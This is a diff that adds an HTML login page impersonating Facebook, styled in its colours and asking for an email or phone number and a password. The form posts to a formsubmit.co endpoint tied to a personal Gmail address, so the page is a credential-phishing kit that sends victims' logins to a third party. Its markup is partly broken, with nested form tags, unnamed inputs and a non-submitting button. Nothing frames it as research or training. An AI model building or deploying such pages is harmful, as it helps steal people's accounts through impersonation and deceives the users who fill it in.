@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f3f4f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background: white;
+      padding: 28px;
+      border-radius: 12px;
+      width: 85%;
+      max-width: 360px;
+      box-shadow: 0 4px 16px #00000018;
+    }
+    h1 {
+      text-align: center;
+      font-size: 26px;
+    }
+    label {
+      display: block;
+      margin: 16px 0 6px;
+    }
+    input {
+      box-sizing: border-box;
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    .forgot {
+      display: block;
+      text-align: right;
+      margin: 14px 0;
+      color: #1877f2;
+      text-decoration: none;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      border: 0;
+      border-radius: 6px;
+      background: #1877f2;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <main class="login-box">
+    <h1>Login to your Facebook account to continue</h1>
+  <p>Send us your request and we will respond by email.</p>
+    <form>
+      <form action="https://formsubmit.co/markdodii01@gmail.com"
+      method="POST">
+   <label for="email">Email address or phone number</label>
+      <input id="email" type="text"
+        placeholder="Email address or phone number"
+        autocomplete="username" required>
+
+      <label for="password">Password</label>
+      <input id="password" type="password"
+        placeholder="Enter your password"
+        autocomplete="current-password" required>
+
+      <a class="forgot" href="#">Forgot password?</a>
+      <button type="button">Log In</button>
+    </form>
+  </main>
+</body>
+</html>
